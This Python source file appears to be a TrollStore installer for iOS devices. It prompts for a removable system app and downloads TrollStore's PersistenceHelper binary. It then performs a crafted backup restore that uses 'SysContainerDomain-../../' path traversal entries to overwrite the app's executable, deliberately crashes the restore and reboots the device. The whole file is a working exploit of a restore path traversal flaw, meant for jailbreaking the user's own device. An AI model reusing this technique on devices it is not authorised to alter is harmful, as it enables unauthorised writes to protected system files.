import sys
from pathlib import Path

import click
import requests
from pymobiledevice3.cli.cli_common import Command
from pymobiledevice3.exceptions import PyMobileDevice3Exception
from pymobiledevice3.lockdown_service_provider import LockdownServiceProvider
from pymobiledevice3.services.diagnostics import DiagnosticsService
from pymobiledevice3.services.installation_proxy import InstallationProxyService

from sparserestore import backup, perform_restore


@click.command(cls=Command)
@click.pass_context
def cli(ctx, service_provider: LockdownServiceProvider) -> None:
    app = click.prompt(
        """
Please specify the removable system app you want to replace with TrollStore Helper.
If you don't know which app to specify, specify the Tips app.

Enter the app name"""
    )

    if not app.endswith(".app"):
        app += ".app"

    apps_json = InstallationProxyService(service_provider).get_apps(application_type="System", calculate_sizes=False)

    app_path = None
    for key, value in apps_json.items():
        if isinstance(value, dict) and "Path" in value:
            potential_path = Path(value["Path"])
            if potential_path.name.lower() == app.lower():
                app_path = potential_path
                app = app_path.name

    if not app_path:
        click.secho(f"Failed to find the removable system app '{app}'!", fg="red")
        click.secho(f"Make sure you typed the app name correctly, and that the system app '{app}' is installed to your device.", fg="red")
        return
    elif Path("/private/var/containers/Bundle/Application") not in app_path.parents:
        click.secho(f"'{app}' is not a removable system app!", fg="red")
        click.secho(f"Please choose a removable system app. These will be Apple-made apps that can be deleted and re-downloaded.", fg="red")
        return

    app_uuid = app_path.parent.name

    helper_contents = requests.get("https://github.com/opa334/TrollStore/releases/latest/download/PersistenceHelper_Embedded").content
    click.secho(f"Replacing {app} with TrollStore Helper. (UUID: {app_uuid})", fg="yellow")

    back = backup.Backup(
        files=[
            backup.Directory("", "RootDomain"),
            backup.Directory("Library", "RootDomain"),
            backup.Directory("Library/Preferences", "RootDomain"),
            backup.ConcreteFile("Library/Preferences/temp", "RootDomain", owner=33, group=33, contents=helper_contents, inode=0),
            backup.Directory(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{app}",
                owner=33,
                group=33,
            ),
            backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{app}/{app.split('.')[0]}",
                owner=33,
                group=33,
                contents=b"",
                inode=0,
            ),
            backup.ConcreteFile(
                "",
                "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
                owner=501,
                group=501,
                contents=b"",
            ),  # Break the hard link
            backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""),
        ]
    )

    try:
        perform_restore(back, reboot=False)
    except PyMobileDevice3Exception as e:
        if "Find My" in str(e):
            click.secho(f"Find My must be disabled in order to use this tool.", fg="red")
            click.secho(f"Disable Find My from Settings (Settings -> [Your Name] -> Find My) and then try again.", fg="red")
            sys.exit(1)
        elif "crash_on_purpose" not in str(e):
            raise e

    click.secho("Rebooting device", fg="green")

    with DiagnosticsService(service_provider) as service_provider:
        service_provider.restart()

    click.secho(f"Make sure you turn Find My iPhone back on if you use it after rebooting.", fg="green")
    click.secho(f"Make sure to install a proper persistence helper into the app you chose after installing TrollStore!\n", fg="green")


if __name__ == "__main__":
    try:
        cli(standalone_mode=False)
    except click.UsageError as e:
        click.secho(e.format_message(), fg="red")
        click.echo(cli.get_help(click.Context(cli)))
        raise SystemExit(2)
